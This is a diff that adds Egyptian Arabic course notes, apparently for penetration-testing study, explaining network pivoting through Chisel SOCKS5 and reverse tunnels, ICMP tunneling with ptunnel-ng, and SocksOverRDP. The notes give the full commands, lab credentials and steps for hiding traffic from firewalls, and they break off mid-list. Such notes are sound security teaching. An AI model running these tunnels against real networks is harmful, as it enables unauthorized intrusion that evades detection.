@@ -8655,3 +8655,3931 @@ DNS
 4. العميل يرسل الأوامر والنتائج داخل **DNS TXT Records** في صورة بيانات مشفرة.
     
 5. تقدر تفتح جلسة تفاعلية (`window -i 1`) وتنفذ أوامر على الجهاز، بينما كل الترافيك يبدو ظاهريًا كأنه استعلامات DNS عادية، وده بيساعد على تقليل فرص اكتشافه في البيئات اللي تسمح بخروج DNS لكنها تراقب أو تمنع أنواع اتصال تانية.
+
+
+----
+# Layer 13
+## SOCKS5 Tunneling with Chisel
+
+## شرح بالمصري بالتفصيل جدًا (من غير ما نسيب سطر إلا ونشرحه)
+
+---
+
+## أولًا... يعني إيه Chisel؟
+
+**Chisel** هو Tool معمول بلغة **Go**.
+
+وظيفته الأساسية:
+
+> يعمل **Tunnel** بين جهازين باستخدام **HTTP** بينما البيانات اللي ماشية جواه متشفرة باستخدام **SSH**.
+
+يعني هو بيعمل حاجة شبه SSH Tunnel لكن بطريقة مختلفة.
+
+---
+
+## المقال بيقول
+
+> Chisel is a TCP/UDP-based tunneling tool.
+
+يعني يقدر ينقل:
+
+- TCP
+    
+- UDP
+    
+
+مش TCP بس.
+
+---
+
+وبيستخدم:
+
+```text
+HTTP
+```
+
+كوسيلة نقل.
+
+لكن الترافيك نفسه متأمن بـ
+
+```text
+SSH Encryption
+```
+
+يعني كأنك عامل SSH Tunnel لكن فوق HTTP.
+
+---
+
+## ليه Chisel مشهور؟
+
+لأنه بيشتغل في أماكن كتير الـ Firewall فيها بيسمح بـ
+
+```text
+HTTP
+```
+
+لكن يمنع
+
+- SSH
+    
+- VPN
+    
+- SOCKS
+    
+
+فهو بيخبي الـ Tunnel داخل HTTP.
+
+---
+
+## السيناريو
+
+المقال عنده الشكل ده
+
+```text
+Attack Host
+10.10.15.5
+        │
+        │
+        ▼
+ Ubuntu Pivot
+10.129.202.64
+172.16.5.129
+        │
+        │
+        ▼
+ Internal Network
+172.16.5.0/23
+        │
+        ▼
+Domain Controller
+172.16.5.19
+```
+
+---
+
+لاحظ إن:
+
+الجهاز بتاعك
+
+```text
+10.10.x.x
+```
+
+ميقدرش يوصل مباشرة إلى
+
+```text
+172.16.x.x
+```
+
+لأنهم شبكتين مختلفتين.
+
+لكن Ubuntu شايف الاتنين.
+
+فهيبقى:
+
+## Pivot Host
+
+---
+
+## أول خطوة
+
+تحميل Chisel.
+
+```bash
+git clone https://github.com/jpillora/chisel.git
+```
+
+يعني:
+
+نزّل المشروع.
+
+---
+
+## ليه Go؟
+
+المقال بيقول:
+
+> لازم Go يكون متسطب.
+
+ليه؟
+
+لأن Chisel مكتوب بـ
+
+```text
+Go Language
+```
+
+---
+
+بعدها:
+
+```bash
+cd chisel
+```
+
+---
+
+ثم:
+
+```bash
+go build
+```
+
+---
+
+## يعني إيه go build؟
+
+ده بيعمل Compile.
+
+يعني يحول
+
+```text
+Source Code
+```
+
+إلى
+
+```text
+Executable Binary
+```
+
+هيطلعلك ملف اسمه:
+
+```text
+chisel
+```
+
+---
+
+## ليه المقال قال ممكن يحصل Error؟
+
+قال بسبب
+
+```text
+glibc
+```
+
+---
+
+يعني مكتبة النظام.
+
+لو نسخة الـ glibc على جهازك غير الموجودة على الهدف.
+
+ممكن الـ Binary يرفض يشتغل.
+
+---
+
+الحل؟
+
+استخدم Version أقدم.
+
+---
+
+## بعد كده
+
+ينقل الملف للـ Pivot.
+
+```bash
+scp chisel ubuntu@10.129.202.64:~/
+```
+
+---
+
+وده معناه:
+
+انسخ الملف إلى
+
+```text
+Home Directory
+```
+
+على Ubuntu.
+
+---
+
+## تشغيل السيرفر
+
+```bash
+./chisel server -v -p 1234 --socks5
+```
+
+وده أهم أمر.
+
+---
+
+## نشرحه
+
+### server
+
+يعني:
+
+شغل Chisel كـ Server.
+
+---
+
+### -v
+
+Verbose.
+
+اطبع Logs.
+
+---
+
+### -p
+
+```text
+1234
+```
+
+البورت اللي هيستقبل عليه.
+
+---
+
+### --socks5
+
+دي أهم واحدة.
+
+يعني:
+
+اعمل
+
+```text
+SOCKS5 Proxy
+```
+
+---
+
+يبقى السيرفر هيبقى عامل:
+
+```text
+SOCKS5 Listener
+```
+
+---
+
+## الناتج
+
+```text
+Listening on
+
+0.0.0.0:1234
+```
+
+يعني:
+
+أي جهاز يقدر يتصل بالسيرفر على
+
+```text
+1234
+```
+
+---
+
+## بعد كده
+
+من جهازك:
+
+```bash
+./chisel client -v 10.129.202.64:1234 socks
+```
+
+---
+
+## نشرحه
+
+### client
+
+يعني:
+
+شغل Chisel كـ Client.
+
+---
+
+### 10.129.202.64
+
+عنوان السيرفر.
+
+---
+
+### 1234
+
+البورت.
+
+---
+
+### socks
+
+دي أهم كلمة.
+
+معناها:
+
+اعمل Local SOCKS Proxy.
+
+---
+
+## الناتج
+
+```text
+Listening
+
+127.0.0.1:1080
+```
+
+يعني عندك اتفتح:
+
+```text
+SOCKS5 Proxy
+
+127.0.0.1
+
+Port 1080
+```
+
+---
+
+## يعني إيه الكلام ده؟
+
+أي Tool يشتغل على:
+
+```text
+127.0.0.1:1080
+```
+
+هيبعت الترافيك داخل الـ Tunnel.
+
+---
+
+## شكل الترافيك
+
+```text
+Nmap
+
+↓
+
+Proxychains
+
+↓
+
+127.0.0.1:1080
+
+↓
+
+Chisel Client
+
+↓
+
+HTTP Tunnel
+
+↓
+
+Ubuntu
+
+↓
+
+Internal Network
+
+↓
+
+172.16.x.x
+```
+
+---
+
+## ليه استخدمنا Proxychains؟
+
+لأن:
+
+Nmap
+
+أو
+
+RDP
+
+مش عارفين يكلموا SOCKS لوحدهم.
+
+Proxychains هو اللي يجبرهم.
+
+---
+
+## تعديل Proxychains
+
+المقال قال:
+
+عدل
+
+```text
+/etc/proxychains.conf
+```
+
+---
+
+آخر الملف:
+
+```text
+socks5 127.0.0.1 1080
+```
+
+---
+
+وده معناه:
+
+أي برنامج يشتغل بـ Proxychains.
+
+روح للـ SOCKS ده.
+
+---
+
+## بعد كده
+
+نقدر نعمل
+
+```bash
+proxychains xfreerdp /v:172.16.5.19
+```
+
+---
+
+لاحظ.
+
+إحنا بنوصل لـ
+
+```text
+172.16.5.19
+```
+
+مع إنه مش ظاهر لنا.
+
+ليه؟
+
+لأن:
+
+الـ Tunnel وصلنا بالشبكة الداخلية.
+
+---
+
+## شكل الرحلة
+
+```text
+xfreerdp
+
+↓
+
+Proxychains
+
+↓
+
+127.0.0.1:1080
+
+↓
+
+Chisel Client
+
+↓
+
+HTTP Tunnel
+
+↓
+
+Ubuntu
+
+↓
+
+172.16.5.19
+```
+
+---
+
+## Reverse Chisel
+
+المقال بعد كده قال:
+
+أوقات الـ Firewall يمنع:
+
+```text
+Incoming Connections
+```
+
+يعني مينفعش أفتح Server على Ubuntu.
+
+---
+
+مثال
+
+Firewall يسمح:
+
+```text
+Ubuntu
+↓
+
+Attack Host
+```
+
+لكن يمنع
+
+```text
+Attack Host
+↓
+
+Ubuntu
+```
+
+---
+
+يبقى الحل؟
+
+نعكس الاتجاه.
+
+وده اسمه:
+
+## Reverse Pivot
+
+---
+
+بدل ما السيرفر يبقى على Ubuntu.
+
+هيبقى على جهازك.
+
+---
+
+تشغل:
+
+```bash
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+
+---
+
+الفرق الوحيد:
+
+```text
+--reverse
+```
+
+---
+
+دي معناها:
+
+اسمح للـ Clients يفتحوا Reverse Tunnel.
+
+---
+
+## بعدها
+
+على Ubuntu
+
+```bash
+./chisel client -v 10.10.14.17:1234 R:socks
+```
+
+---
+
+لاحظ
+
+بدل
+
+```text
+socks
+```
+
+بقت
+
+```text
+R:socks
+```
+
+---
+
+ليه؟
+
+R معناها
+
+```text
+Reverse
+```
+
+---
+
+يعني
+
+بدل ما الـ Client يعمل Proxy عنده.
+
+هيخلي السيرفر يعمل Proxy.
+
+---
+
+## بعد الاتصال
+
+على جهازك
+
+هيظهر:
+
+```text
+127.0.0.1:1080
+```
+
+---
+
+كأنك شغال بالطريقة العادية.
+
+لكن الحقيقة:
+
+Ubuntu هو اللي فتح الاتصال.
+
+---
+
+## بعدها
+
+Proxychains
+
+```text
+↓
+
+127.0.0.1:1080
+
+↓
+
+Reverse Tunnel
+
+↓
+
+Ubuntu
+
+↓
+
+Internal Network
+```
+
+---
+
+## ليه Reverse مهم؟
+
+لأن معظم الشركات تمنع:
+
+```text
+Inbound
+```
+
+لكن تسمح:
+
+```text
+Outbound
+```
+
+يعني:
+
+الجهاز الداخلي يطلع برة.
+
+لكن محدش يدخل له.
+
+وده بالضبط اللي بيستغله Reverse Tunnel.
+
+---
+
+## الفرق بين Chisel و SSH
+
+|SSH|Chisel|
+|---|---|
+|يحتاج SSH Service|لا يحتاج SSH Service على الهدف|
+|يعتمد على SSH Protocol|يعتمد على HTTP/WebSocket مع تشفير شبيه بـ SSH|
+|قد تمنعه بعض الـ Firewalls|غالبًا يمر لأن HTTP مسموح|
+|سريع وسهل|مرن أكثر في البيئات المقيدة|
+
+---
+
+## الفرق بين Chisel و Socat
+
+|Chisel|Socat|
+|---|---|
+|يعمل SOCKS Proxy|يعمل Port Forward فقط|
+|HTTP Tunnel|TCP Redirect|
+|يدعم Reverse بسهولة|يحتاج إعدادات إضافية|
+|مناسب للـ Pivoting الكامل|مناسب لإعادة توجيه بورت معين|
+
+---
+
+## الفرق بين Chisel و SSH Dynamic Port Forward
+
+|SSH -D|Chisel|
+|---|---|
+|يحتاج SSH Server|لا يشترط SSH Server|
+|ينشئ SOCKS Proxy|ينشئ SOCKS Proxy|
+|يعتمد على SSH|يعتمد على HTTP|
+|قد يُحجب بسهولة|غالبًا يمر عبر Firewalls التي تسمح بالويب|
+
+---
+
+## ملخص حفظ الامتحان
+
+## Chisel Server
+
+```bash
+./chisel server -p 1234 --socks5
+```
+
+يفتح SOCKS Server.
+
+---
+
+## Chisel Client
+
+```bash
+./chisel client SERVER_IP:1234 socks
+```
+
+ينشئ Local SOCKS Proxy على:
+
+```text
+127.0.0.1:1080
+```
+
+---
+
+## Proxychains
+
+```text
+socks5 127.0.0.1 1080
+```
+
+يجعل أي أداة تستخدم النفق.
+
+---
+
+## Reverse Mode
+
+السيرفر:
+
+```bash
+./chisel server --reverse --socks5
+```
+
+العميل:
+
+```bash
+./chisel client SERVER_IP:1234 R:socks
+```
+
+---
+
+## الخلاصة
+
+**Chisel** هو أداة Pivoting وTunneling قوية تنشئ **SOCKS5 Proxy** فوق **HTTP** مع تشفير للاتصال، مما يسمح بالوصول إلى شبكات داخلية غير قابلة للوصول مباشرة. في الوضع العادي (**Forward Pivot**) يكون الـ **Server** على الـ Pivot Host والـ **Client** على جهاز المهاجم. أما في **Reverse Pivot** فينعكس الاتجاه، فيكون الـ **Server** على جهاز المهاجم والـ **Client** على الـ Pivot Host، وهو السيناريو المناسب عندما تمنع الجدران النارية الاتصالات الواردة وتسمح فقط بالاتصالات الخارجة. بعد إنشاء النفق، يمكن استخدام أدوات مثل **Nmap** و**RDP** و**xfreerdp** عبر **Proxychains** للوصول إلى الأجهزة الموجودة داخل الشبكة الداخلية وكأنها متصلة مباشرة بجهازك.
+
+---
+# Layer 14
+## ICMP Tunneling with SOCKS
+
+## شرح بالمصري بالتفصيل جدًا (من غير ما نسيب ولا سطر)
+
+---
+
+## أولًا... يعني إيه ICMP؟
+
+قبل ما نفهم **ICMP Tunneling** لازم نفهم يعني إيه ICMP أصلاً.
+
+ICMP اختصار لـ
+
+```text
+Internet Control Message Protocol
+```
+
+وده بروتوكول وظيفته الأساسية:
+
+> إرسال رسائل خاصة بالشبكة (Networking Messages)
+
+يعني مش بينقل ملفات ولا Web ولا SSH.
+
+هو معمول علشان يبلغ عن حالة الشبكة.
+
+---
+
+## أشهر استخدام للـ ICMP
+
+لما تكتب:
+
+```bash
+ping google.com
+```
+
+إيه اللي بيحصل؟
+
+الجهاز يبعت
+
+```text
+ICMP Echo Request
+```
+
+ويرجعله
+
+```text
+ICMP Echo Reply
+```
+
+يعني:
+
+```text
+أنا موجود؟
+
+↓
+
+أيوه أنا موجود
+```
+
+---
+
+## شكله
+
+```text
+Your PC
+     │
+     │ ICMP Echo Request
+     ▼
+Server
+
+     ▲
+     │ ICMP Echo Reply
+     │
+```
+
+---
+
+## طيب يعني إيه ICMP Tunneling؟
+
+الفكرة بسيطة جدًا.
+
+بدل ما الـ ICMP يحمل:
+
+```text
+Ping فقط
+```
+
+هنخليه يشيل:
+
+- SSH
+    
+- TCP
+    
+- بيانات
+    
+- ملفات
+    
+- Reverse Shell
+    
+
+يعني هنستخدم الـ Ping كأنه أنبوبة (Tunnel).
+
+---
+
+## مثال بسيط جدًا
+
+بدل ما تبعت:
+
+```text
+PING
+```
+
+تبعت:
+
+```text
+PING + SSH DATA
+```
+
+والطرف التاني يفك البيانات.
+
+---
+
+وده اسمه:
+
+## ICMP Tunnel
+
+---
+
+## ليه نستخدمه؟
+
+المقال بيقول:
+
+> بيشتغل لو الـ Firewall بيسمح بالـ Ping.
+
+كتير من الشركات تمنع:
+
+- HTTP
+    
+- HTTPS
+    
+- VPN
+    
+- SSH
+    
+
+لكن تسيب:
+
+```text
+Ping
+```
+
+لأنه مهم لاختبار الشبكة.
+
+فالمهاجم يستغل ده.
+
+---
+
+## السيناريو
+
+```text
+Attack Host
+10.10.14.18
+      │
+      │ ICMP
+      ▼
+Ubuntu Pivot
+10.129.202.64
+172.16.5.129
+      │
+      ▼
+Internal Network
+172.16.5.x
+```
+
+---
+
+## الأداة المستخدمة
+
+اسمها
+
+```text
+ptunnel-ng
+```
+
+---
+
+## يعني إيه ptunnel؟
+
+هي Tool بتعمل:
+
+```text
+TCP over ICMP
+```
+
+يعني:
+
+تحط TCP داخل Ping.
+
+---
+
+## أول خطوة
+
+تحميل المشروع.
+
+```bash
+git clone https://github.com/utoni/ptunnel-ng.git
+```
+
+---
+
+بعدها
+
+يشغل:
+
+```bash
+./autogen.sh
+```
+
+---
+
+## يعني إيه autogen؟
+
+ده Script بيجهز المشروع.
+
+وبيعمل:
+
+- Configure
+    
+- Makefiles
+    
+- Build
+    
+
+---
+
+بعدها تقدر تستخدم:
+
+```text
+ptunnel-ng
+```
+
+---
+
+## المقال قال فيه طريقة تانية
+
+لو فيه مشاكل توافق.
+
+نعمل:
+
+```bash
+./autogen.sh
+```
+
+لكن بعد تعديل
+
+```text
+LDFLAGS
+```
+
+---
+
+## ليه؟
+
+علشان يبني
+
+```text
+Static Binary
+```
+
+---
+
+## يعني إيه Static Binary؟
+
+يعني البرنامج يبقى شايل المكتبات جواه.
+
+بدل ما يعتمد على مكتبات النظام.
+
+وده مهم جدًا في الـ Pentest.
+
+---
+
+## بعد كده
+
+ننقل البرنامج.
+
+```bash
+scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+```
+
+---
+
+## تشغيل السيرفر
+
+```bash
+sudo ./ptunnel-ng -r10.129.202.64 -R22
+```
+
+وده أهم أمر.
+
+---
+
+## نشرحه
+
+### -r
+
+```text
+10.129.202.64
+```
+
+يعني:
+
+الـ IP اللي السيرفر هيقبل عليه الاتصالات.
+
+---
+
+### -R22
+
+دي أهم واحدة.
+
+يعني:
+
+أي حاجة توصلني...
+
+وديها إلى
+
+```text
+Port 22
+```
+
+يعني:
+
+SSH.
+
+---
+
+يبقى السيرفر بيقول:
+
+```text
+أي Ping يوصلني
+
+↓
+
+فكه
+
+↓
+
+طلّع منه TCP
+
+↓
+
+ابعت TCP إلى SSH
+```
+
+---
+
+## الناتج
+
+```text
+Forwarding incoming ping packets over TCP
+```
+
+يعني:
+
+أي Ping.
+
+هنحوله إلى TCP.
+
+---
+
+## على جهازك
+
+نشغل العميل.
+
+```bash
+sudo ./ptunnel-ng \
+-p10.129.202.64 \
+-l2222 \
+-r10.129.202.64 \
+-R22
+```
+
+---
+
+## نشرحه
+
+### -p
+
+عنوان السيرفر.
+
+---
+
+### -l2222
+
+افتح عندي Local Port
+
+```text
+2222
+```
+
+---
+
+يعني هيبقى عندي:
+
+```text
+127.0.0.1:2222
+```
+
+---
+
+### -R22
+
+أي اتصال يروح لـ
+
+```text
+22
+```
+
+على Ubuntu.
+
+---
+
+## يبقى الرحلة
+
+```text
+SSH
+
+↓
+
+127.0.0.1:2222
+
+↓
+
+ptunnel Client
+
+↓
+
+ICMP
+
+↓
+
+ptunnel Server
+
+↓
+
+SSH 22
+```
+
+---
+
+## بعد كده
+
+نعمل SSH
+
+```bash
+ssh -p2222 -lubuntu 127.0.0.1
+```
+
+---
+
+ليه 127؟
+
+لأننا بنتصل بالـ Tunnel.
+
+مش بالسيرفر الحقيقي.
+
+---
+
+يعني:
+
+```text
+SSH
+
+↓
+
+localhost
+
+↓
+
+ptunnel
+
+↓
+
+Ping
+
+↓
+
+Ubuntu
+
+↓
+
+SSH
+```
+
+---
+
+## لو نجح
+
+هنشوف
+
+```text
+Welcome to Ubuntu
+```
+
+---
+
+وده معناه
+
+إن SSH كله
+
+ماشي داخل
+
+```text
+Ping
+```
+
+---
+
+## إحصائيات
+
+المقال قال:
+
+```text
+Session Statistics
+```
+
+---
+
+زى:
+
+```text
+Packets
+```
+
+---
+
+و
+
+```text
+Loss
+```
+
+---
+
+يعني:
+
+كام Ping اتبعت.
+
+كام واحد ضاع.
+
+---
+
+## بعد كده
+
+المقال عمل حركة جميلة.
+
+بدل ما يستخدم SSH عادي.
+
+شغل:
+
+```bash
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+```
+
+---
+
+لاحظ
+
+الجديد هنا
+
+```text
+-D
+```
+
+---
+
+وده معناه
+
+اعمل
+
+```text
+Dynamic Port Forward
+```
+
+---
+
+يعني:
+
+SOCKS Proxy.
+
+---
+
+يبقى عندك:
+
+```text
+127.0.0.1:9050
+```
+
+---
+
+وده SOCKS Proxy.
+
+---
+
+## شكله
+
+```text
+Nmap
+
+↓
+
+Proxychains
+
+↓
+
+9050
+
+↓
+
+SSH Dynamic Port Forward
+
+↓
+
+ICMP Tunnel
+
+↓
+
+Ubuntu
+
+↓
+
+Internal Network
+```
+
+---
+
+## بعدها
+
+نستخدم Proxychains.
+
+```bash
+proxychains nmap \
+-sV \
+-sT \
+172.16.5.19
+```
+
+---
+
+## إيه اللي حصل؟
+
+Nmap
+
+افتكر إنه بيكلم
+
+```text
+172.16.5.19
+```
+
+لكن الحقيقة:
+
+```text
+Nmap
+
+↓
+
+SOCKS
+
+↓
+
+SSH
+
+↓
+
+ICMP
+
+↓
+
+Ubuntu
+
+↓
+
+172.16.5.19
+```
+
+---
+
+## الناتج
+
+لقينا
+
+```text
+3389
+
+Open
+```
+
+يعني:
+
+قدرنا نوصل.
+
+---
+
+## ليه استخدمنا ICMP؟
+
+لأن:
+
+TCP
+
+كان ممكن يبقى مقفول.
+
+لكن
+
+```text
+Ping
+
+↓
+
+مفتوح
+```
+
+---
+
+## Wireshark
+
+المقال قال:
+
+جرب افتح
+
+Wireshark.
+
+---
+
+هيوريك الفرق.
+
+---
+
+## بدون Tunnel
+
+هنشوف
+
+```text
+TCP
+
+↓
+
+SSH
+```
+
+---
+
+## مع Tunnel
+
+هنشوف
+
+```text
+ICMP
+
+↓
+
+Echo Request
+
+↓
+
+Echo Reply
+```
+
+---
+
+يعني.
+
+الـ SSH اختفى.
+
+وبقى كله Ping.
+
+---
+
+## شكل الترافيك
+
+بدون Tunnel
+
+```text
+SSH
+
+↓
+
+TCP
+
+↓
+
+Firewall
+```
+
+---
+
+مع Tunnel
+
+```text
+SSH
+
+↓
+
+ptunnel
+
+↓
+
+ICMP
+
+↓
+
+Firewall
+```
+
+---
+
+## الفرق بين ICMP Tunnel و DNS Tunnel
+
+|ICMP Tunnel|DNS Tunnel|
+|---|---|
+|يعتمد على Ping|يعتمد على DNS|
+|أسرع نسبيًا|أبطأ|
+|يحتاج السماح بـ ICMP|يحتاج السماح بـ DNS|
+|مناسب لنقل TCP|مناسب أكثر لـ C2 ونقل بيانات صغيرة|
+
+---
+
+## الفرق بين ICMP Tunnel و Chisel
+
+|Chisel|ptunnel-ng|
+|---|---|
+|HTTP Tunnel|ICMP Tunnel|
+|يستخدم HTTP/WebSocket|يستخدم Ping|
+|يحتاج HTTP مسموح|يحتاج ICMP مسموح|
+|أسرع|أبطأ نسبيًا|
+
+---
+
+## الفرق بين ICMP Tunnel و SSH Tunnel
+
+|SSH Tunnel|ICMP Tunnel|
+|---|---|
+|يعتمد على TCP 22|يعتمد على ICMP|
+|قد تمنعه الـ Firewall|قد يمر إذا كان الـ Ping مسموحًا|
+|سهل اكتشافه كاتصال SSH|قد يبدو كترافيك Ping عادي|
+
+---
+
+## خطوات التنفيذ بالترتيب
+
+## ① على الـ Pivot
+
+```bash
+./ptunnel-ng -r TARGET_IP -R22
+```
+
+يشغل Server.
+
+---
+
+## ② على جهازك
+
+```bash
+./ptunnel-ng \
+-p TARGET_IP \
+-l2222 \
+-r TARGET_IP \
+-R22
+```
+
+ينشئ Local Tunnel.
+
+---
+
+## ③ افتح SSH
+
+```bash
+ssh -p2222 ubuntu@127.0.0.1
+```
+
+---
+
+## ④ اعمل Dynamic Port Forward
+
+```bash
+ssh -D9050 -p2222 ubuntu@127.0.0.1
+```
+
+---
+
+## ⑤ استخدم Proxychains
+
+```bash
+proxychains nmap
+```
+
+أو
+
+```bash
+proxychains xfreerdp
+```
+
+أو أي أداة تعتمد على TCP.
+
+---
+
+## الخلاصة
+
+**ICMP Tunneling** هو أسلوب بيستخدم **رسائل الـ Ping (ICMP Echo Request/Reply)** كقناة لنقل بيانات بروتوكولات تانية مثل **SSH** أو أي اتصال TCP. أداة **ptunnel-ng** بتستقبل البيانات من برنامج زي SSH، تغلفها داخل حزم ICMP، وتبعتها للطرف الآخر، وهناك يتم فكها وإرسالها إلى الخدمة المطلوبة (مثل SSH على البورت 22). بعد إنشاء الاتصال، ممكن تستخدم **SSH Dynamic Port Forwarding (`-D`)** لإنشاء **SOCKS Proxy**، وبعدها تشغل أدوات مثل **Nmap** أو **RDP** أو غيرها عبر **Proxychains** للوصول إلى الشبكة الداخلية، بينما الترافيك اللي يراه الـ Firewall أو Wireshark يكون في صورة **Ping** بدل اتصالات SSH أو TCP التقليدية. هذا الأسلوب مفيد فقط إذا كانت الشبكة تسمح بمرور **ICMP**، ولذلك يعتمد نجاحه على سياسات الجدار الناري في البيئة المستهدفة.
+
+
+
+# Layer 15
+## شرح SocksOverRDP بالمصري (بالتفصيل)
+
+الموضوع ده يعتبر من أشهر طرق الـ **Pivoting داخل بيئات Windows**، خصوصًا لو **SSH مش موجود** أو ممنوع.
+
+---
+
+## المشكلة اللي بنواجهها
+
+نفترض إن عندنا الشبكة دي:
+
+```text
+                  External Network
+                  10.129.x.x
+
+        Kali
+      10.10.15.5
+           │
+           │ RDP
+           │
+──────────────────────────────────────
+      Windows10 (Foothold)
+10.129.15.150
+172.16.5.19
+──────────────────────────────────────
+           │
+           │
+           │
+      Internal Network
+      172.16.6.x
+           │
+           │
+      DC
+172.16.6.155
+```
+
+إحنا قدرنا نوصل لأول جهاز Windows (`172.16.5.19`) عن طريق RDP.
+
+لكن عايزين نوصل للجهاز اللي بعده (`172.16.6.155`).
+
+المشكلة إن:
+
+- مفيش SSH
+    
+- مفيش VPN
+    
+- مفيش إمكانية نستخدم Chisel أو SSH Tunnel
+    
+
+لكن عندنا RDP.
+
+يبقى نستغل الـ RDP نفسه.
+
+---
+
+## يعنى إيه SocksOverRDP؟
+
+هو Tool بيحول جلسة الـ RDP نفسها إلى **SOCKS Proxy**.
+
+يعني بدل ما الـ RDP يستخدم فقط:
+
+- Keyboard
+    
+- Mouse
+    
+- Clipboard
+    
+- Audio
+    
+
+إحنا هنخليه ينقل أي Traffic إحنا عايزينه.
+
+---
+
+## الفكرة الأساسية
+
+بدل:
+
+```text
+Kali
+ │
+ │ RDP
+ ▼
+Windows
+```
+
+تبقى:
+
+```text
+Kali
+ │
+ │ RDP
+ │
+ │
+SOCKS Proxy
+ │
+ ▼
+Windows
+ │
+ ▼
+Internal Network
+```
+
+يعني الـ RDP بقى Tunnel.
+
+---
+
+## الأول نفهم DVC
+
+المقال قال:
+
+> Dynamic Virtual Channels (DVC)
+
+وده أهم جزء.
+
+---
+
+## يعني إيه DVC؟
+
+لما تفتح Remote Desktop بيكون فيه أكتر من Channel.
+
+مثلاً:
+
+```text
+Keyboard
+
+Mouse
+
+Clipboard
+
+Audio
+
+Printer
+
+Drive Sharing
+```
+
+كل واحدة دي اسمها Channel.
+
+---
+
+## Dynamic Virtual Channels
+
+دي Channels إضافية.
+
+Microsoft عاملاها علشان البرامج تستخدمها.
+
+يعني أي برنامج ممكن يقول:
+
+"أنا عايز Channel جديدة."
+
+---
+
+مثلاً
+
+```text
+Clipboard
+
+↓
+
+DVC رقم 1
+```
+
+Audio
+
+↓
+
+```text
+DVC رقم 2
+```
+
+---
+
+SocksOverRDP يعمل:
+
+```text
+SOCKS Traffic
+
+↓
+
+DVC جديد
+```
+
+وبالتالي ينقل الترافيك كله داخل الـ RDP.
+
+---
+
+## ليه دي فكرة ذكية؟
+
+لأن الـ Firewall شايف:
+
+```text
+RDP فقط
+```
+
+لكن الحقيقة:
+
+جوه الـ RDP
+
+فيه:
+
+- HTTP
+    
+- SMB
+    
+- RDP تاني
+    
+- LDAP
+    
+- WinRM
+    
+- أي بروتوكول
+    
+
+---
+
+## الأدوات المطلوبة
+
+المقال بيقول:
+
+```
+SocksOverRDP x64
+
+Proxifier Portable
+```
+
+---
+
+## SocksOverRDP
+
+هو اللي هيعمل الـ Tunnel.
+
+---
+
+## Proxifier
+
+هو اللي هيخلي البرامج تستخدم الـ SOCKS.
+
+زي بالضبط:
+
+```text
+Proxychains
+
+لكن على Windows
+```
+
+---
+
+## الخطوة الأولى
+
+ننقل
+
+```text
+SocksOverRDP-x64.zip
+```
+
+للجهاز الأول.
+
+---
+
+بعدها نفك الضغط.
+
+---
+
+هيكون فيه ملفات زي:
+
+```text
+Plugin.dll
+
+Server.exe
+```
+
+---
+
+## الخطوة الثانية
+
+نسجل الـ DLL.
+
+```cmd
+regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+---
+
+## يعني إيه regsvr32؟
+
+برنامج موجود في Windows.
+
+وظيفته:
+
+يسجل DLL.
+
+---
+
+يعني بدل ما الـ DLL يبقى مجرد ملف.
+
+يبقى Windows يعرف يستخدمه.
+
+---
+
+بعد التنفيذ هيطلع:
+
+```text
+Succeeded
+```
+
+---
+
+يبقى الـ Plugin بقى متسجل.
+
+---
+
+## الخطوة الثالثة
+
+نعمل RDP.
+
+مثلاً:
+
+```text
+mstsc.exe
+```
+
+ونتصل:
+
+```text
+172.16.5.19
+```
+
+بـ
+
+```text
+victor
+
+pass@123
+```
+
+---
+
+بعد الدخول
+
+هيطلع:
+
+```text
+Plugin Enabled
+```
+
+---
+
+وكمان:
+
+```text
+Listening on
+
+127.0.0.1:1080
+```
+
+---
+
+وده أهم سطر.
+
+---
+
+## ليه 127.0.0.1؟
+
+لأن الـ SOCKS بيشتغل Local.
+
+---
+
+يبقى أي برنامج هيكلم:
+
+```text
+127.0.0.1
+
+Port 1080
+```
+
+هيعدي داخل الـ RDP.
+
+---
+
+## الخطوة الرابعة
+
+على الجهاز الداخلي.
+
+ننقل
+
+```text
+SocksOverRDP-Server.exe
+```
+
+---
+
+ونشغله كـ
+
+Administrator.
+
+---
+
+ليه؟
+
+لأنه محتاج يفتح الـ Channel.
+
+---
+
+بعد التشغيل.
+
+الـ Server والـ Plugin هيعملوا Tunnel.
+
+---
+
+الشكل هيبقى:
+
+```text
+Plugin
+
+⇄
+
+RDP
+
+⇄
+
+Server
+```
+
+---
+
+## الخطوة الخامسة
+
+نتأكد إنه شغال.
+
+```cmd
+netstat -antb | findstr 1080
+```
+
+---
+
+هيطلع:
+
+```text
+127.0.0.1:1080
+
+LISTENING
+```
+
+---
+
+يعني عندك SOCKS Proxy.
+
+---
+
+## دلوقتي فين الـ SOCKS؟
+
+على:
+
+```text
+127.0.0.1
+
+1080
+```
+
+---
+
+## الخطوة السادسة
+
+ننقل
+
+```text
+Proxifier
+```
+
+للجهاز الأول.
+
+---
+
+ونشغله.
+
+---
+
+## Proxifier بيعمل إيه؟
+
+هو زي Proxychains.
+
+لكن للويندوز.
+
+---
+
+أي برنامج يفتح Socket.
+
+Proxifier يقول:
+
+"استنى."
+
+بدل ما تروح مباشرة.
+
+روح على:
+
+```text
+127.0.0.1
+
+1080
+```
+
+---
+
+وبالتالي:
+
+```text
+Chrome
+
+↓
+
+SOCKS
+```
+
+---
+
+```text
+mstsc
+
+↓
+
+SOCKS
+```
+
+---
+
+```text
+PowerShell
+
+↓
+
+SOCKS
+```
+
+---
+
+أي برنامج.
+
+---
+
+## بعد إعداد Proxifier
+
+نفتح
+
+```text
+mstsc.exe
+```
+
+لكن المرة دي
+
+بدل ما يروح مباشرة.
+
+هيعدي من الـ SOCKS.
+
+---
+
+يبقى الترافيك:
+
+```text
+mstsc
+
+↓
+
+Proxifier
+
+↓
+
+127.0.0.1:1080
+
+↓
+
+RDP Tunnel
+
+↓
+
+SocksOverRDP Server
+
+↓
+
+172.16.6.155
+```
+
+---
+
+## الشكل النهائي
+
+```text
+              Kali
+
+                 │
+
+                 │ RDP
+
+                 ▼
+
+        Windows الأول
+      172.16.5.19
+
+      SocksOverRDP
+
+        SOCKS :1080
+
+                 │
+
+==============================
+         RDP Tunnel
+==============================
+
+                 │
+
+                 ▼
+
+      SocksOverRDP Server
+
+                 │
+
+                 ▼
+
+      Windows الثاني
+
+      172.16.6.155
+```
+
+---
+
+## ليه استخدم SocksOverRDP؟
+
+لأن أحيانًا الشركة تمنع:
+
+- SSH
+    
+- VPN
+    
+- Reverse Shell
+    
+- Chisel
+    
+- Socat
+    
+
